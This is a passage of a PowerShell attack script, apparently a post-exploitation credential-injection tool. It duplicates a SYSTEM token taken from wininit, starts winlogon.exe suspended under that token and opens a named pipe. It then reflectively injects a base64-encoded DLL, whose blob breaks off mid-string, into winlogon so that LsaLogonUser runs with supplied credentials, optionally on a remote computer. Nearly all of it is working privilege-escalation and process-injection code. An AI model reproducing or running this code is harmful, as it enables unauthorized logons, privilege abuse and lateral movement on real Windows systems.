	    #Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	    {
		    $ExeArgs = "ReflectiveExe $ExeArgs"
	    }
	    else
	    {
		    $ExeArgs = "ReflectiveExe"
	    }

	    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName)
	    }
	    else
	    {
		    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName) -ComputerName $ComputerName
	    }
    }

    Main
    }



    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
        CREATE_SUSPENDED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #Struct STARTUPINFO
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
    $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
	$STARTUPINFO = $TypeBuilder.CreateType()

    #Struct PROCESS_INFORMATION
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
	$TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
	$PROCESS_INFORMATION = $TypeBuilder.CreateType()
    ###############################


    ###############################
    #Win32Functions
    ###############################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)    

    $CreateProcessWithTokenWAddr = Get-ProcAddress advapi32.dll CreateProcessWithTokenW
	$CreateProcessWithTokenWDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	$CreateProcessWithTokenW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessWithTokenWAddr, $CreateProcessWithTokenWDelegate)

    $memsetAddr = Get-ProcAddress msvcrt.dll memset
	$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

    $LsaFreeReturnBufferAddr = Get-ProcAddress secur32.dll LsaFreeReturnBuffer
	$LsaFreeReturnBufferDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$LsaFreeReturnBuffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LsaFreeReturnBufferAddr, $LsaFreeReturnBufferDelegate)

    $GetProcessIdAddr = Get-ProcAddress Kernel32.dll GetProcessId
	$GetProcessIdDelegate = Get-DelegateType @([IntPtr]) ([UInt32])
	$GetProcessId = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcessIdAddr, $GetProcessIdDelegate)
    ###############################


    #Get the primary token for the specified processId
    #This function is taken from my script Invoke-TokenManipulation
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,

            #Open the token with all privileges. Requires SYSTEM because some of the privileges are restricted to SYSTEM.
            [Parameter()]
            [Switch]
            $FullPrivs
        )

        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }

        $ReturnStruct = New-Object PSObject

        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            #If a process is a protected process it cannot be enumerated. This call should only fail for protected processes.
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)

            #Close the handle to hProcess (the process handle)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero

            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }

        return $ReturnStruct
    }


    #A modified version of this function from my script Invoke-TokenManipulation
    #Creates the process suspended. Returns the ProcessID of the created process
    function Create-SuspendedWinLogon
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken #The token to create the process with
        )

        $ProcessId = -1

        #Duplicate the token so it can be used to create a new process
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) #The first parameter (cb) is a DWORD which is the size of the struct

            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)

            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$($env:windir)\system32\winlogon.exe")

            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, [IntPtr]::Zero, $Win32Constants.CREATE_SUSPENDED, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
            if ($Success)
            {
                #Free the handles returned in the ProcessInfo structure
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)

                $ProcessId = $GetProcessId.Invoke($ProcessInfo.hProcess)

                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CreateProcessWithTokenW failed. Error code: $ErrorCode"
            }

            #Free StartupInfo memory and ProcessInfo memory
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero

            #Close handle for the token duplicated with DuplicateTokenEx
            $Success = $CloseHandle.Invoke($NewHToken)
            $NewHToken = [IntPtr]::Zero
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
            }

            return $ProcessId
        }
    }


    #Get the SYSTEM token and create a winlogon process with it, returns the process ID of the new WinLogon process
    function Create-WinLogonProcess
    {
        if ([Environment]::UserName -ine "SYSTEM")
        {
            #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
            $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
            if ($systemTokenInfo -eq $null -or $SystemTokenInfo.hProcToken -eq [IntPtr]::Zero)
            {
                Write-Warning "Unable to get SYSTEM token"
            }
            else
            {
                $ProcessId = Create-SuspendedWinLogon -hToken $SystemTokenInfo.hProcToken
                if ($ProcessId -eq -1)
                {
                    Throw "Unable to create suspended WinLogon process"
                }

                Write-Verbose "Created suspended winlogon process. ProcessId: $ProcessId"
                return $ProcessId
            }
        }
    }


    #Set up a named pipe to communicate with the injected DLL
    function Create-NamedPipe
    {
        $PipeSecurity = new-object System.IO.Pipes.PipeSecurity
        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "NT AUTHORITY\SYSTEM", "ReadWrite", "Allow" )
        $PipeSecurity.AddAccessRule($AccessRule)
        $Pipe=new-object System.IO.Pipes.NamedPipeServerStream("sqsvc","InOut",100, "Byte", "None", 1024, 1024, $PipeSecurity)

        return $Pipe
    }
    

    #Determine the parameterset being used to figure out if a new winlogon process needs to be created or not
    if ($PsCmdlet.ParameterSetName -ieq "NewWinLogon")
    {
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Error "NewWinLogon mode cannot be used when running in Session 0" -ErrorAction Stop
        }

        #Start winlogon.exe as SYSTEM
        $WinLogonProcessId = Create-WinLogonProcess
        Write-Output "Created winlogon process to call LsaLogonUser in. Kill ProcessID $WinLogonProcessId when done impersonating."
        Write-Output "Execute: Stop-Process $WinLogonProcessId -force"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "ExistingWinLogon")
    {
        $WinLogonProcessId = (Get-Process -Name "winlogon"| Select-Object -first 1).Id
    }

    #Get a ushort representing the logontype
    [Byte]$LogonTypeNum = 0x0
    switch ($LogonType)
    {
        "Interactive" {$LogonTypeNum = 2}
        "NetworkCleartext" {$LogonTypeNum = 8}
        "RemoteInteractive" {$LogonTypeNum = 10}
    }

    $AuthPackageNum = 0
    #Get a ushort representing the authentication package to use
    switch ($AuthPackage)
    {
        "Msv1_0" {$AuthPackageNum = 1}
        "Kerberos" {$AuthPackageNum = 2}
    }


    #Main
    try
    {
        $Pipe = Create-NamedPipe

        #Reflectively inject a DLL in to the new winlogon process which will receive credentials and call LsaLogonUser from within winlogon.exe
        $Logon32Bit_Base64 = "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